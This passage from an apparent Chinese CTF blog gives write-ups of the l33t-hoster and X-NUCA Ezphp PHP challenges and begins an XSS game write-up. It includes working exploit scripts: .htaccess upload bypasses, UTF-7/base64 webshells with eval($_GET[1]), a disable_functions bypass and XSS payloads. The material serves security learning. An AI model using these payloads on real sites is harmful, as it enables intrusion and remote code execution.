$disallowed_ext, TRUE)) { die(\"lol nice try, but im not stupid dude...\");} 本题对于文件名的处理大致就是这么处理，所以直接传.htaccess会在第一个判断时把$parts全都置为空。 因为文件名分割是以explode(\".\", $name);分割，所以我们可以用多个点来进行绕过，例如可以用..htaccess 接下来就是绕过后面的判断了，exif_imagetype绕过比较简单，可以直接使用 gif 的头GIF98a绕过就行了，但是后面的长度检测就比较麻烦了，这里 check 了文件内容的大小，而且重要的是.htaccess需要标准的格式，如果前面有非标准冗余的内容，.htaccess会解析失败。 1234$image_size = getimagesize($tmp_name);if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {die(\"lol noob, your pic is not l33t enough\");} 所以我们需要找到一个比较特殊的图片格式 查看 wiki 我们可以知道 ​ XBM files differ markedly from most image files in that they take the form of C source files. This means that they can be compiled directly into an application without any preprocessing steps, but it also makes them far larger than their raw pixel data. The image data is encoded as a comma-separated list of byte values, each written in the C hexadecimal notation, ‘0x13’ for example, so that multiple ASCII characters are used to express a single byte of image information 并且在 wiki 中我们也可以得到一个 sample : 12345#define test_width 16#define test_height 7static char test_bits[] = {0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 }; XBM 文件竟然可以用#define来规定图片的 width &amp; height，而#在.htaccess文件中恰好是注释符，也不会引起解析错误，所以我们可以往这个方向去试一试。 将 width &amp; height 改成需要的数值，这样我们就可以上传.htaccess了 webshell既然可以上传了.htaccess，那接下来就是到传 webshell 了。 1234$image = file_get_contents($tmp_name);if (mb_strpos($image, \"&lt;?\") !== FALSE) { die(\"why would you need php in a pic.....\");} 主要就是对&lt;?的绕过了，这里我们可以使用htaccess的另外一些技巧来进行绕过，我们可以在 How to change configuration settings 这里查找到 php 关于.htaccess的处理文档。 并且我们可以看到有一个比较有意思的选项： ​ zend.multibyte boolean Enables parsing of source files in multibyte encodings. Enabling zend.multibyte is required to use character encodings like SJIS, BIG5, etc that contain special characters in multibyte string data. ISO-8859-1 compatible encodings like UTF-8, EUC, etc do not require this option. Enabling zend.multibyte requires the mbstring extension to be available. 以及 ​ zend.script_encoding string This value will be used unless a declare(encoding=…) directive appears at the top of the script. When ISO-8859-1 incompatible encoding is used, both zend.multibyte and zend.script_encoding must be used. Literal strings will be transliterated from zend.script_enconding to mbstring.internal_encoding, as ifmb_convert_encoding() would have been called. 并且我们在 Supported Character Encodings 可以找到 php 支持的编码方式，根据这两个选项我们就可以利用编码的形式来编码我们的文件内容，然后利用.htaccess的设置来进行解码执行。 所以这里我们可以使用 UTF-7 编码来进行编码内容，并且使用auto_append_file把.htaccess的内容在执行时追加入到当前目录的文件中，例如在.htaccess中我们可以这么这么写 1234567#define test_width 1337#define test_height 1337AddType application/x-httpd-php .xbmphp_flag zend.multibyte 1php_value zend.script_encoding \"UTF-7\"php_value auto_append_file .htaccess#+ADw?php phpinfo()+ADs 然后再上传一个宽度高度符合要求的 xbm 文件即可。 当然也可以使用其他编码啦，比如 utf-16，一种大端编码的方式，一个字符由两个字节编码，我们可以这么构造： exp.php 中的内容就是你想上传的 php 代码 12345678910111213141516171819202122232425262728293031import requestsVALID_XBM = b\"\"\"#define width 1337#define height 1337\"\"\"URL = \"http://your_url/upload/?\"RANDOM_DIRECTORY = \"674b2fcf215d9e16619a0ad3648e704ee50377e5\"COOKIES = { \"PHPSESSID\" : \"fsppftvh6q5kpf8e0b7e9p2le5\"}def upload_content(name, content): data = { \"image\" : (name, content, 'image/png'), \"upload\" : (None, \"Submit Query\", None) } return requests.post(URL, files=data, cookies=COOKIES)HT_ACCESS = VALID_XBM + b\"\"\"AddType application/x-httpd-php .zeddphp_value zend.multibyte 1php_value zend.detect_unicode 1php_value display_errors 1\"\"\"TARGET_FILE = VALID_XBM + open(\"exp.php\", 'r').read().encode('utf-16')upload_content(\"..htaccess\", HT_ACCESS)upload_content(\"source.zedd\", TARGET_FILE) WBMP.htaccess除了 XBM 文件，当然还有其他文件可以利用啦。例如 wbmp 格式的图片文件。 因为在.htaccess 中0x00开头的一行会与#一样被当作注释处理，然后我们也可以发现标准的 xbm 格式： 1234567891011$ xxd test3.wbmp | head00000000: 0000 8930 8620 0000 0000 0000 0000 0000 ...0. ..........00000010: 0000 0000 0000 0000 0012 4908 0002 0081 ..........I.....00000020: 0440 0000 0000 0000 0000 0000 2400 0009 .@..........$...00000030: 2092 4800 0000 0000 0000 0000 1248 4012 .H..........H@.00000040: 4000 0040 2224 954a a4aa 9224 8900 8410 @..@\"$.J...$....00000050: 0012 52a8 8889 2494 94a5 5540 0000 1000 ..R...$...U@....00000060: 0000 5480 0200 0928 0000 0000 0000 002a ..T....(.......*00000070: 9248 0001 2555 2490 0000 0000 0000 0000 .H..%U$.........00000080: 0000 0000 0000 0000 1124 a555 5555 5555 .........$.UUUUU00000090: 52aa 4a55 5555 5555 4aaa a8aa 0000 0000 R.JUUUUUJ....... 可以发现这个的开头其实就是0x00，所以接下来我们只需要更改图片的 width &amp; height 就可以了，但是貌似并没有一个标准的文件格式供我们参考，于是我们可以单独一位一位地去尝试，这样我们就可以得到一个最小的基本没有冗余数据的 wbmp 文件了。 1234567891011121314151617&lt;?phperror_reporting(0);$contents = file_get_contents(\"test3.wbmp\");$i = 0;while (true) { $truncated = substr($contents, 0, $i); file_put_contents(\"truncated.wbmp\", $truncated); if (exif_imagetype(\"truncated.wbmp\")) break; $i += 1;}echo \"Shortest file size : $i\\n\";var_dump(exif_imagetype(\"truncated.wbmp\"));var_dump(getimagesize(\"truncated.wbmp\")); 然后我们可以根据 Wireless Application Protocol Bitmap Format ，可以看出大致的文件构造： Field name Field type Size (in bytes) Purpose Type uintvar variable Type of the image, and is 0 for monochrome bitmaps. Fixed header byte 1 Reserved. Always 0. Width uintvar variable Width of the image in pixels. Height uintvar variable Height of the image in pixels. Data byte array variable Data bytes arranged in rows – one bit per pixel. A black pixel is denoted by 0 and a white pixel is denoted by 1. Where the row length is not divisible by 8, the row is 0-padded to the byte boundary. 还有这个 wbmp 的宽度高度格式有点奇怪，第三位是以 128 为基数算的，所以这里只能凑一下得到 1337 的高与宽 这里需要注意一下有个坑，直接提交的话还不知什么原因会自动加上0xefbf污染了原数据，所以这里需要手动写脚本交一下。 12345678910111213141516171819202122232425import requestsimport base64VALID_WBMP = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a\"URL = \"http://your_url/upload/?\"RANDOM_DIRECTORY = \"674b2fcf215d9e16619a0ad3648e704ee50377e5\"COOKIES = { \"PHPSESSID\" : \"kivnml45mpi9ohknv2i8s8ecoj\"}def upload_content(name, content): data = { \"image\" : (name, content, 'image/png'), \"upload\" : (None, \"Submit Query\", None) } response = requests.post(URL, files=data, cookies=COOKIES)HT_ACCESS = VALID_WBMP + b\"\"\"AddType application/x-httpd-php .zedd\"\"\"upload_content(\"..htaccess\", HT_ACCESS) webshell既然能传.htaccess了，当然我们也可以用上面提到的 UTF-7 编码绕过，但是这里我们可以换另一种形式，比如 base64。 ​ auto_append_file string Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used. The special value none disables auto-appending. 让我们仔细看看这个定义，这个功能就相当于使用了require方法，所以我们当然也可以使用php://filter啦，比如我们最常用的文件包含php://filter/read=convert.base64-decode/resource= 所以我们可以先传一个用 WBMP 格式头伪装的文件，文件中有经过 base64 编码过后的 php 代码，然后经过.htaccess的作用，我们就可以执行任意 php 代码了，但是这里需要注意的是，base64 编码解码的时候，会把整个文件内容当作字符串解码，意思就是说，WBMP 格式头当然也会被解码，这里需要让文件头凑够足够的位数，比如在\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a中，这里一共有 56 bit，base64 在解码的时候，24 bit 为一组，再分成三个字节进行解码，56 bit 不足 72(24*3 ) bit ，需要去我们添加的数据进行补齐，所以就会造成“污染”了我们构造的编码数据。所以这里我们只需要再增加到 72 bit 即可，也就是 2(16bit) 字节，让文件头与这 2 字节被一起解码即可，解码结果不影响 php 解析即可。 所以完整脚本如下： 1234567891011121314151617181920212223242526272829303132333435import requestsimport base64VALID_WBMP = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a\"URL = \"http://your_url/upload/?\"RANDOM_DIRECTORY = \"674b2fcf215d9e16619a0ad3648e704ee50377e5\"COOKIES = { \"PHPSESSID\" : \"kivnml45mpi9ohknv2i8s8ecoj\"}def upload_content(name, content): data = { \"image\" : (name, content, 'image/png'), \"upload\" : (None, \"Submit Query\", None) } response = requests.post(URL, files=data, cookies=COOKIES)HT_ACCESS = VALID_WBMP + b\"\"\"AddType application/x-httpd-php .zeddphp_value auto_append_file \"php://filter/convert.base64-decode/resource=source.zedd\"\"\"\"TARGET_FILE = VALID_WBMP + b\"AA\" + base64.b64encode(b\"\"\"&lt;?php phpinfo();?&gt;\"\"\")upload_content(\"..htaccess\", HT_ACCESS)upload_content(\"source.zedd\", TARGET_FILE)upload_content(\"shell.zedd\", VALID_WBMP)response = requests.post(URL + \"/images/\" + RANDOM_DIRECTORY + \"/shell.zedd\")print(response.text) Get Shell先看 phpinfo ，果不其然还要 bypass disable_function 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,posix_mkfifo, pg_lo_import, dbmopen, dbase_open, popen, chgrp, chown, chmod, symlink,apache_setenv,define_syslog_variables, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_uname, proc_close, pclose, proc_nice, proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,imap_open,fopen,copy,rename,readfile,readlink,tmpfile,tempnam,touch,link,file_put_contents,file,ftp_connect,ftp_ssl_connect 没有禁止 putenv()，那我们就可以用 LD_PRELOAD那一套就行了。然而这里没有权限导致不能直接使用蚁剑的 as_bypass_php_disable_functions 插件，但是我们可以自己写一个上传界面上传我们需要的文件就行了。比如我们可以这么写 .htaccess 1234567#define test_width 1337#define test_height 1337AddType application/x-httpd-php .xbmphp_flag zend.multibyte 1php_value zend.script_encoding \"UTF-7\"php_value auto_append_file .htaccess#+ADw?php if (isset(+ACQAXw-POST+AFsAIg-upload+ACIAXQ)) +AHsAJA-tmp+AF8-name +AD0 +ACQAXw-FILES+AFsAIg-image+ACIAXQBbACI-tmp+AF8-name+ACIAXQA7ACQ-name +AD0 +ACQAXw-FILES+AFsAIg-image+ACIAXQBbACI-name+ACIAXQA7ACQ-parts +AD0 explode(+ACI.+ACI, +ACQ-name)+ADsAJA-ext +AD0 array+AF8-pop(+ACQ-parts)+ADsAJA-name +AD0 implode(+ACI.+ACI, +ACQ-parts)+ADs-move+AF8-uploaded+AF8-file(+ACQ-tmp+AF8-name, +ACI./+ACI.+ACQ-name . +ACI.+ACI . +ACQ-ext)+ADsAfQ?+AD4APA-h1+AD4-Upload your pics+ACEAPA-/h1+AD4APA-form method+AD0AIg-POST+ACI action+AD0AIg?+ACI enctype+AD0AIg-multipart/form-data+ACIAPgA8-input type+AD0AIg-file+ACI name+AD0AIg-image+ACIAPgA8-input type+AD0AIg-submit+ACI name+AD0-upload+AD4APA-/form+AD4- UTF-7 解码之后就是： 1&lt;?php if (isset($_POST[\"upload\"])) {$tmp_name = $_FILES[\"image\"][\"tmp_name\"];$name = $_FILES[\"image\"][\"name\"];$parts = explode(\".\", $name);$ext = array_pop($parts);$name = implode(\".\", $parts);move_uploaded_file($tmp_name, \"./\".$name . \".\" . $ext);}?&gt;&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=\"POST\" action=\"?\" enctype=\"multipart/form-data\"&gt;&lt;input type=\"file\" name=\"image\"&gt;&lt;input type=\"submit\" name=upload&gt;&lt;/form&gt; 然后就是上传 .so 文件进行 LD_PRELOAD 那一套了，比较坑的是，拿到 flag 还是需要一个在极短时间内算数的门槛，这里就直接借鉴其他人的脚本了： 1234567891011121314151617181920212223#!/usr/bin/env perl use warnings;use strict;use IPC::Open2;$| = 1;chdir \"/\"; #!!!!!!!!!!!!!!!!!!!!!!!!!!my $pid = open2(\\*out2, \\*in2, './get_flag') or die;my $reply = &lt;out2&gt;;print STDOUT $reply; #string: solve captcha..$reply = &lt;out2&gt;;print STDOUT $reply; #captcha formulamy $answer = eval($reply);print STDOUT \"answer: $answer\\n\"; print in2 \" $answer \"; #send it to processin2-&gt;flush();$reply = &lt;out2&gt;;print STDOUT $reply; #flag :D 直接传上去运行就行了。 Ezphp让我们回到本次的主题 Ezphp，题目直接给出了源码 12345678910111213141516171819202122232425262728293031323334 &lt;?php $files = scandir('./'); foreach($files as $file) { if(is_file($file)){ if ($file !== \"index.php\") { unlink($file); } } } include_once(\"fl3g.php\"); if(!isset($_GET['content']) || !isset($_GET['filename'])) { highlight_file(__FILE__); die(); } $content = $_GET['content']; if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) { echo \"Hacker\"; die(); } $filename = $_GET['filename']; if(preg_match(\"/[^a-z\\.]/\", $filename) == 1) { echo \"Hacker\"; die(); } $files = scandir('./'); foreach($files as $file) { if(is_file($file)){ if ($file !== \"index.php\") { unlink($file); } } } file_put_contents($filename, $content . \"\\nJust one chance\");?&gt; 很明显，这里我们可以直接写入.htaccess来 get flag。 我们可以看到有以下限制： 每次都会unlink删除当前所有文件 有 on / html / type / flag / upload / file 关键字大小写过滤 文件自动包含fl3g.php，但是文件名有/[^a-z\\.]/正则限制 最后还会有\\n换行追加数据导致.htaccess解析错误的限制 这里比赛的时候比较恶心的是 ichunqiu 自动给容器套了一层 nginx 代理，404 或者 500 的时候返回的是 nginx 错误页面…然后当时我是排除了 .htaccess 的利用…然后就偏了… 有了上题的知识其实我们不难有一些思路：可以利用编码绕过一些判定，例如stristr函数的判断。 而且这里比较让我们值得注意的是fl3g.php的包含，虽然每次都会首先执行删除当前目录下所有的文件，但是之后又都会去尝试包含fl3g.php，那我们是不是可以有什么操作去写入fl3g.php呢？当然如果通过题目给的写入功能由于有[^a-z\\.]正则的存在是肯定写不进去的。 于是我们需要把写入文件的功能点放在.htaccess关注点上来，根据 How to change configuration settings ，我们可以知道在.htaccess当中我们可以使用几种类型格式来更改 php 配置 1234567php_value name valuephp_flag name on|offphp_admin_value name valuephp_admin_flag name on|off 虽然flag被作为关键字过滤了，但是无论是php_flag还是php_amdin_flag只是php_value的简化，能通过php_flag设置的参数我们大部分还是都可以用php_value去设置的，虽然文档有以下说明： ​ Note: Don’t use php_value to set boolean values. php_flag (see below) should be used instead. 在 List of php.ini directives 当中我们可以找到支持更改的 php 配置选项，其中有几个我们值得去关注。 One Way-error ​ error_log string Name of the file where script errors should be logged. The file should be writable by the web server’s user. If the special value syslog is used, the errors are sent to the system logger instead. On Unix, this means syslog(3) and on Windows it means the event log. See also: syslog(). If this directive is not set, errors are sent to the SAPI error logger. For example, it is an error log in Apache or stderr in CLI. See also error_log(). error_log可以把error_reporting设置的错误等级写入到设置的文件当中，这个看起来我们可以利用该函数来就进行报错写入文件，但是对于一开始就删除当前文件夹下所有文件的操作，即使我们可以写入自定义内容，也会被删除。所以我们可能还需要找另外一条路径使得该文件可以保存下来。 ​ include_path string Specifies a list of directories where the require, include, fopen(), file(), readfile() and file_get_contents() functions look for files. The format is like the system’s PATH environment variable: a list of directories separated with a colon in Unix or semicolon in Windows. PHP considers each entry in the include path separately when looking for files to include. It will check the first path, and if it doesn’t find it, check the next path, until it either locates the included file or returns with a warning or an error. You may modify or set your include path at runtime using set_include_path(). 在阅读文档我们还可以发现include_path这个设置，他可以指定include等包含函数包含的环境路径，而题目代码使用的是scandir('./');作为获取当前文件的操作，只是删除当前文件，而error_log又可以指定路径。所以我们大概可以有这么个思路： 使用error_log指定一个非当前文件路径的可写路径，例如/tmp/fl3g.php 利用include_path指定包含的环境路径为/tmp 这样include包含的时候，就是包含到了/tmp/fl3g.php 这样就可以绕过删除当前文件夹下所有文件的操作了。 接下来就是error_log写文件内容的问题了，让我们本地试试看，为了方便，按照上面的思路直接写一个.htaccess在当前文件夹下，内容是 12php_value error_log /tmp/fl3g.phpphp_value include_path /tmp 访问index.php，得到的错误有 123Warning: include_once(fl3g.php): failed to open stream: No such file or directory in /xxx/index.php on line 10Warning: include_once(): Failed opening 'fl3g.php' for inclusion (include_path='.:/Applications/MAMP/bin/php/php7.1.26/lib/php') in /xxx/index.php on line 10 这时候/tmp/fl3g.php当中的内容也是上面的内容，这时候.htaccess因为我们访问了过一次index.php被删除了，所以我们需要再写一次.htaccess，还是一样的内容。 接着访问index.php，可以看见我们包含的效果如下： 之后我们就要思考怎么把一些恶意代码插到报错的内容当中了。 既然上面都是通过include不存在的文件产生报错，那我们是不是也可以利用include_path来构造一些错误。 例如我们可以首先通过这么来构造一个不存在的包含路径让恶意代码插入到/tmp/fl3g.php当中，.htaccess文件内容如下： 12php_value error_log /tmp/fl3g.phpphp_value include_path '&lt;?php phpinfo();?&gt;' 访问index.php我们可以看到： 这里&lt;被进行了 html 编码，所以我们这样去用include_path '/tmp'包含的/tmp/fl3g.php，自然也不可能执行代码。所以我们可能需要一些技巧来使得这些可以被解析。 有了上一题的基础，我们知道可以使用编码来进行解析文件，所以在这里，我们可以先用 UTF-7 编码写入，再利用.htaccess解码 UTF-7 所以，先尝试利用 UTF-7 编码我们需要插入的恶意代码，写入.htaccess的文件内容如下： 12php_value error_log /tmp/fl3g.phpphp_value include_path '+ADw?php phpinfo()+ADs?+AD4-' 然后访问index.php触发报错写入 log 文件/tmp/fl3g.php，文件内容如下： 12[03-Oct-2019 16:23:51 Asia/Shanghai] PHP Warning: include_once(fl3g.php): failed to open stream: No such file or directory in /xxx/index.php on line 10[03-Oct-2019 16:23:51 Asia/Shanghai] PHP Warning: include_once(): Failed opening 'fl3g.php' for inclusion (include_path='+ADw?php phpinfo()+ADs?+AD4-') in /xxx/index.php on line 10 再把以下内容写入.htaccess： 1234php_value error_log /tmp/fl3g.phpphp_value include_path '/tmp'php_value zend.multibyte 1php_value zend.script_encoding \"UTF-7\" 访问index.php 得到 php-info 当然这里编码类型有很多，不仅仅只是 UTF-7 \\n至于最后的\\nJust one chance，因为它影响到了.htaccess文件解析，所以我们首先想到的肯定是利用#注释符将整句话都注视掉，但是又由于有\\n换行符的存在，我们不能直接使用#就将其注释掉，需要把\\n进行“吃”掉。 那么最常见的操作就是利用\\斜杠将其转义了，这样\\\\n就是一个简单的\\n字符串了。 Exp: 1234567891011121314151617181920212223242526PAYLOAD1 = \"\"\"php_value error_log /tmp/fl3g.phpphp_value error_reporting 32767php_value include_path \"+ADw?php eval($_GET[1])+ADs?+AD4-\"# \\\\\"\"\"PAYLOAD2 = \"\"\"php_value include_path \"/tmp\"php_value zend.multibyte 1php_value zend.script_encoding \"UTF-7\"# \\\\\"\"\"URL = \"http://xxx/index.php\"def upload_content(name, content): data = { \"content\" : content, \"filename\" : name, } return requests.get(URL, params=data)rep = upload_content(\".htaccess\", PAYLOAD1)print(rep.text)rep = upload_content(\".htaccess\", PAYLOAD2)print(rep.text) Another Way-Pcre手册中还允许设置 pcre.backtrack_limit ，这个可以更改正则回溯的次数，具体可以参考 PHP利用PCRE回溯次数限制绕过某些安全限制 这里我们看到题目的代码正则部分是 1234if(preg_match(\"/[^a-z\\.]/\", $filename) == 1) { echo \"Hacker2\"; die();} 这里是判断是否为 1 ，如果为 1 则 die ，而根据正则回溯，当超过回溯次数，preg_match会返回false，自然就可以绕过了。 12php_value pcre.backtrack_limit 0php_value pcre.jit 0 所以我们可以先上传以上内容到.htaccess，利用这个回溯特性可以绕过 filename 的检测，那我们可以对 filename 做点什么操作呢？直接写入 fl3g.php ？走你 123456789101112131415161718192021222324import requestsPAYLOAD3 = \"\"\"php_value pcre.backtrack_limit 0php_value pcre.jit 0# \\\\\"\"\"PAYLOAD4 = \"\"\"&lt;?php phpinfo();?&gt;\"\"\"URL = \"http://xxx/index.php\"def upload_content(name, content): data = { \"content\" : content, \"filename\" : name, } return requests.get(URL, params=data)rep = upload_content(\".htaccess\", PAYLOAD3)print(rep.text)rep = upload_content(\"fl3g.php\", PAYLOAD4)print(rep.text) 然后直接访问 fl3g.php 即可。 ROIS 这里使用了一种比较复杂的方法，首先同样上传.htaccess把 pcre 回溯限制改成 0，然后使用 base64 写文件绕过stristr的判断，使用auto_append_file包含.htaccess，在.htaccess当中写注释 webshell 即可。 首先上传.htaccess，内容为： 12php_value pcre.backtrack_limit 0php_value pcre.jit 0 再次上传名为php://filter/write=convert.base64-decode/resource=.htaccess，内容为 1cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKCnBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCgpwaHBfdmFsdWUgcGNyZS5qaXQgICAwCgojPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c base64 解码的内容是 1234567php_value pcre.backtrack_limit 0php_value auto_append_file \".htaccess\"php_value pcre.jit 0#&lt;?php eval($_GET[1]);?&gt;\\ Exp: 12345678910111213141516171819202122232425import requestsPAYLOAD5 = \"\"\"php_value pcre.backtrack_limit 0php_value pcre.jit 0# \\\\\"\"\"PAYLOAD6 = \"\"\"cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKCnBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCgpwaHBfdmFsdWUgcGNyZS5qaXQgICAwCgojPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c\"\"\"URL = \"http://zedd.cc/xnuca/index.php\"def upload_content(name, content): data = { \"content\" : content, \"filename\" : name, \"1\": \"echo 'Done!';\" } return requests.get(URL, params=data)rep = upload_content(\".htaccess\", PAYLOAD5)print(rep.text)rep = upload_content(\"php://filter/write=convert.base64-decode/resource=.htaccess\", PAYLOAD6)print(rep.text) Another Way-backward slash既然能用\\绕过最后的\\n，同样我们也可以用来绕过stristr，而且不影响.htaccess的解析 Exp: 1234567891011121314151617181920import requestsPAYLOAD7 = \"\"\"php_value auto_prepend_fi\\\\le \".htaccess\"#&lt;?php phpinfo();?&gt;\\\\\"\"\"URL = \"http://xxx/index.php\"def upload_content(name, content): data = { \"content\" : content, \"filename\" : name, } return requests.get(URL, params=data)rep = upload_content(\".htaccess\", PAYLOAD7)print(rep.text) 可以一步到位 ReferenceInsomnihack Teaser 2019 / l33t-hoster [l33t-hoster]([https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md](https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack 2019/l33t-hoster/l33t-hoster.md)) XNUCA2019 ez系列web题解 X-NUCA 2019 线上赛 Writeup By ROIS","link":"/2019/10/03/xnuca-2019-ezphp/"},{"title":"XSS GAME","text":"过年期间玩了一下国外的一个 XSS GAME，收获颇丰，记录一下学习过程。本人对于 JavaScript 以及前端的理解不深，水平也不高，如果文章有疏漏之处，还请师傅们斧正。 文章首发于安全客：https://www.anquanke.com/post/id/198496 Introduction所有题目的目标都是实现alert(1337)即可，有着不同的难度 Area 51123456789&lt;!-- Challenge --&gt;&lt;div id=\"pwnme\"&gt;&lt;/div&gt;&lt;script&gt; var input = (new URL(location).searchParams.get('debug') || '').replace(/[\\!\\-\\/\\#\\&amp;\\;\\%]/g, '_'); var template = document.createElement('template'); template.innerHTML = input; pwnme.innerHTML = \"&lt;!-- &lt;p&gt; DEBUG: \" + template.outerHTML + \" &lt;/p&gt; --&gt;\";&lt;/script&gt; 题目源代码如上，题目代码比较简单，首先对用户传入的 debug 参数进行关键字过滤转换，对于!-/#&amp;;%符号都会被下划线替代，然后创建一个 template 标签，标签的 HTML 内容为我们传入的内容，最后在一个 div 中，把构建好的 template 标签输出在一个注释当中。 所以我们的主要得绕过注释符的限制，由于&lt;!--是多行注释，所以换行的思路我们基本不可行，即使没有把--过滤，JS也会在第一步template.innerHTML将我们的--&gt;中的&gt;进行转义。所以基本上我们可以“直接“闭合的思路是行不通的。 首先我们需要知道 HTML 解析顺序，首先先解析 HTML 部分代码，再用 JS 解释器 JS 代码，JS解释器会边解释边执行，对于 innerHTML 会使用 HTML parser 解析其中的代码。本题会利用到一些 HTML parser 的知识，建议配合 W3 文档 The HTML syntax，不想看英文的话也可以凑合凑合看看本菜之前写的 关于 HTML 编码 的水文。 Easy Version我们先来看看第一个简单的版本，当时由于出题者比较疏忽，并没有过滤&amp;#;，导致了我们可以用 HTML 实体编码进行绕过，直接闭合注释进而实现 alert ，例如，在没有过滤&amp;#;的情况，我们可以这么做： 1&lt;img title=\"&amp;#x2D;&amp;#x2D;&amp;#x3E;&amp;#x3C;&amp;#x73;&amp;#x76;&amp;#x67;&amp;#x2F;&amp;#x6F;&amp;#x6E;&amp;#x6C;&amp;#x6F;&amp;#x61;&amp;#x64;&amp;#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x29;&amp;#x3E;\"&gt;1 使用 HTML 编码将我们的 payload 进行编码绕过 1--&gt;&lt;svg/onload=alert()&gt; 但是这里我们并不能直接传入 HTML 编码绕过，得需要加一个 img 标签利用其属性进行绕过，为什么呢？ 因为这里其实有两次 HTML 解码的操作，第一个是template.innerHTML，第二个是pwnme.innerHTML，第一个解码操作会直接把我们传入的参数进行解码，并且对其中的&lt;&gt;进行转义，也就是说，实际上第一个得到的是如下内容： 1--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt; 在第二步渲染的时候就自然不可能闭合注释了，只能得到如下代码： 1&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt; 所以当我们借助 img 属性进行绕过的时候，第一步得到的实际上是： 1&lt;img title=\"--&gt;&lt;svg/onload=alert()&gt;\"&gt;1 HTML parser不会将 title 属性内的字符串进行转义，所以第二步当直接输出到页面的时候 1&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=\"--&gt;&lt;svg onload=\"alert()\"&gt;\"&amp;gt;1 &lt;/svg&gt;&lt;p&gt;&lt;/p&gt; --&amp;gt; 然后当 HTML parser 解析这段代码时，首先由&lt;!的存在，会进入Markup declaration open state，中间的代码&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=\"会让 HTML parser 进入一些其他关于 comment 的状态，这些都无关紧要，最后的--&gt;让 HTML parser 进入到了Comment End State，根据 W3 文档： Comment end state Consume the next input character: U+003E GREATER-THAN SIGN (&gt;) Switch to the data state. Emit the comment token. 接着我们就进入到了 data state，也就是结束了注释解析状态回到了最开始的 HTML 解析状态，这样就导致我们就成功逃逸了注释符。 Difficult Version再过滤了实体编码&amp;#;之后我们要怎么绕过呢？我们先给出一个 Trick ，在这里我们可以使用&lt;?进行绕过。 可以看到我们在使用了&lt;?之后成功把 p 标签逃逸了出来，可是为什么呢？我们可以输出第一步的template.innerHTML看看 我们可以发现在第一步渲染的时候，传入的&lt;?已经变成了&lt;!--?--&gt;，存在--&gt;可以将注释闭合。可是这是为什么呢？ 在template.innerHTML = input的时候，会解析input，然后使用 HTML parser 解析，根据 W3 文档 ​ Implementations must act as if they used the following state machine to tokenize HTML. The state machine must start in the data state. 解析到&lt;的时候，HTML parser 正处于 data state Data state Consume the next input character: U+0026 AMPERSAND (&amp;) Set the return state to the data state. Switch to the character reference state. U+003C LESS-THAN SIGN (&lt;) Switch to the tag open state. U+0000 NULL Parse error. Emit the current input character as a character token. EOF Emit an end-of-file token. Anything else Emit the current input character as a character token. 于是进入 tag open state Tag open state Consume the next input character: U+0021 EXCLAMATION MARK (!) Switch to the markup declaration open state. U+002F SOLIDUS (/) Switch to the end tag open state. ASCII letter Create a new start tag token, set its tag name to the empty string. Reconsume in the tag name state. U+003F QUESTION MARK (?) Parse error. Create a comment token whose data is the empty string. Reconsume in the bogus comment state. Anything else Parse error. Emit a U+003C LESS-THAN SIGN character token. Reconsume in the data state. 下一个字符是?，根据文档，HTML parser 会创建一个空的 comment token，进入 bogus comment state， Bogus comment state Consume the next input character: U+003E GREATER-THAN SIGN (&gt;) Switch to the data state. Emit the comment token. EOF Emit the comment. Emit an end-of-file token. U+0000 NULL Append a U+FFFD REPLACEMENT CHARACTER character to the comment token’s data. Anything else Append the current input character to the comment token’s data. 下一个字符是 anything else，会将这个字符插入到刚刚的 comment 中，也就是我们上图看到的&lt;!--?--&gt;，例如输入是aaa&lt;?bbb&gt;ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的： 123456789101112aaaaaaaaa&lt;aaa&lt;!--?--&gt;aaa&lt;!--?b--&gt;aaa&lt;!--?bb--&gt;aaa&lt;!--?bbb--&gt;aaa&lt;!--?bbb--&gt;aaa&lt;!--?bbb--&gt;caaa&lt;!--?bbb--&gt;ccaaa&lt;!--?bbb--&gt;ccc 直到该状态遇到了&gt;为止，回到 data state。注意这个 Bogus comment state 解析到&gt;的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。 当我们传入&lt;?&gt;&lt;svg onload=alert()&gt;时，第一步template.innerHTML我们得到的是 1&lt;!--?--&gt;&lt;svg onload=\"alert()\"&gt;&lt;/svg&gt; 